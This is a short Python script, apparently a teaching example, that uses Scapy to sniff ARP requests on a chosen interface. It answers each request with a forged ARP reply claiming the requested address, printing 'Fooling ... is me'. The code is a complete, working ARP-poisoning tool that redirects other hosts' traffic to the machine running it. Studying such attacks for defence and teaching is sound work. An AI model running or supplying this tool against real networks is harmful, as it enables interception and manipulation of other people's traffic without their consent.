#!/usr/bin/python

# is-at, declares the packet as an ARP response.
#
# Its important to call the function sendp() and not the function send(), 
# because the packet should be sent on layer 2. 
# The function send() sends packets on layer 3.
import sys
from scapy.all import sniff, sendp, ARP, Ether

if len(sys.argv) < 2:
  print sys.argv[0] + " <iface>"
  sys.exit(0)

def arp_poison_callback(packet):
  # Got ARP request?
  if packet[ARP].op == 1:
    answer = Ether(dst=packet[ARP].hwsrc) / ARP()
    answer[ARP].op = "is-at"
    answer[ARP].hwdst = packet[ARP].hwsrc
    answer[ARP].psrc = packet[ARP].pdst
    answer[ARP].pdst = packet[ARP].psrc
    print "Fooling " + packet[ARP].psrc + " that " + \
      packet[ARP].pdst + " is me"
    sendp(answer, iface=sys.argv[1])
    
# The received packets are automatically filtered by the PCAP filter arp that guarantees that callback function
# arp_poison_callback will only get called with ARP packets as input

sniff(prn=arp_poison_callback,
      filter="arp",
      iface=sys.argv[1],
      store=0)
